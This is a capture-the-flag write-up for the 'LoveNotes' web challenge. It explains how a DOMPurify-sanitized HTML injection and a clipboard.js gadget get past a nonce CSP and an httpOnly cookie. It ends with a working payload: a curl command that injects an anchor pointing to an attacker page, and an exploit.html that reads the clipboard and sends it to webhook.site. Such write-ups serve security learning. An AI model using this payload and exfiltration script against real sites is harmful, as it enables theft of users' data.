# WEB/LoveNotes
## Description
Its Valentine's week and your crush lost her account and now its on you to get back her account and this is your last chance to get a Valentine.
Brace yourself, clear your clipboard and fall in love with hacking while she falls for you :) 

## Challenge Overview

We are given a simple website where the params note and secret are being taken from the URL and The application handles the note input in a specific way that allows HTML injection,

We can report these notes to the bot which is a headless browser (Puppeteer) that visits the shared link and then clicks the button with id reveal-btn which unblurs the content of the secret param and the flag
is in the cookie of the bot but also its being added in the dom as a hidden div and for protection from html injection DOMpurify(famous library used as XSS sanitizer) is being used, 

And the CSP was `default-src 'none';` This locks the door completely. By default, nothing is allowed to load or run (no images, no scripts, no frames, etc.).

`script-src 'nonce-${nonce}';` This is the only key to the lock. It tells the browser: "Only execute JavaScript if it has this exact, random secret code attached to it.".

Because the nonce changes with every single request (it is generated randomly here`const nonce = crypto.randomBytes(16).toString('hex');`), an attacker cannot inject their own script because they can't guess the secret code for that specific visit.

And even if they were able to execute JS with HTML injection then also they wouldn't have been able to steal the cookie easily as when we are setting the cookie in bot.js

```javascript
await page.setCookie({ 
                name: 'flag', 
                value: CONFIG.APPFLAG, 
                domain: new URL(url).hostname, 
                httpOnly: true,
                sameSite: 'Strict'
            });
```
the `httpOnly:true` hides the cookie from JS and when you send an external request to any other website this `sameSite:'Strict'` thing does not let it send cookie to sites unless its exact same site that set it.

The other odd thing was in the bot configs as it was doing something like `context.overridePermissions(undefined, ['clipboard-read', 'clipboard-write']);` and the description was also suuggesting something related with clipboard
and there is a clipboard library being used in the page 

```html
<script nonce="<%= nonce %>" src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>
```
So there has to be something related to that as there doesn't seem to be any other way from which we could try to exploit

## Vulnerability

Ok so we see that the clipboard library is setting up a listener on the button with class `share btn`  

```javascript
    <button class="share-btn" data-clipboard-text="<%= shareLink %>">
        🔗 Copy Link to Note
    </button>
.
.
new ClipboardJS('.share-btn');
```
And the listener looks for the data-* attributes (like data-clipboard-target) to decide what text to copy and on some searching you would get to know that DOMpurify doesn't filter 
these custom data-* attributes so then if you went to the docs of [clipboard.js](https://clipboardjs.com/) library , you would find this example
```html
<textarea id="bar">Mussum ipsum cacilds...</textarea>

<!-- Trigger -->
<button class="btn" data-clipboard-action="copy" data-clipboard-target="#bar">
    Copy to clipboard
</button>
```
Using the `data-clipboard-target` attribute in your trigger element, you can copy content from another element like in this example we set this to `#bar` so the text of the element with id bar would be copied as we set `data-clipboard-action="copy"`

And since button tag is not blocked with DOMpurify or in this case the anchor tag was also in the allowed list of DOMpurify, We have found a way to copy the content of the the element with the id cookie but there is one problem we need a click from
the bot for this to work but the bot only clicks with the element with class `share-btn` but we could add this class in any of the <a> or <button> tag since its also not blocked by DOMpurify and when there are multiple elements with same class then 
the bot would click on the first instance and since our note comes before the share div in DOM, We have found a way to copy the cookie but now How do we steal it like or how do we send it to us ?

Now remember the odd permission that were set for bot that gave browser the permission to read the contents of the clipboard so if the bot came to our website and it had the flag in its clipboard then we can steal it using JS.

So now How do we get the bot to our website, there has to be a reason why there are some tags allowed and we see the anchor tag , in which if we click on it we go to the link which is in its href attribute and NOW I think all the things
seem to get connected and yes thats how we exploit this vulnerability like its not a bug or soemthing , It was a Gadget, A piece of legitimate code (like a library or a function) already present on the page that an attacker can "repurpose" to do harm.

So the final paylaod was 
```bash
curl -X POST http://34.66.182.218:8012/bot  -d "secret=anything" --data-urlencode "note=<h1>hello</h1><a href=\"https://<ATTACKER>/exploit.html\" class=\"share-btn\" id=\"reveal-btn\" data-clipboard-action=\"copy\" data-clipboard-target=\"#cookie\">Copy Text</a>"
```
and the exploit.html was 

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <h2>Stealing Flag...</h2>
    <script>
        setTimeout(async () => {
            try {
                // 1. Read the clipboard
                const text = await navigator.clipboard.readText();
                
                // 2. Send it to your webhook (Replace with your actual UUID)
                // We use 'no-cors' mode just to ensure the request goes out 
                // even if the webhook doesn't return the right headers.
                await fetch('https://webhook.site/id?flag=' + encodeURIComponent(text), {
                    mode: 'no-cors'
                });
                
                document.body.innerText = "Flag sent! Check webhook.";
            } catch (e) {
                // Report errors
                fetch('https://webhook.site/id?error=' + encodeURIComponent(e.message), {
                    mode: 'no-cors'
                });
            }
        }, 1500); 
    </script>
</body>
</html>
```

Hope you had fun solving this challenge and maybe learned some new things :)
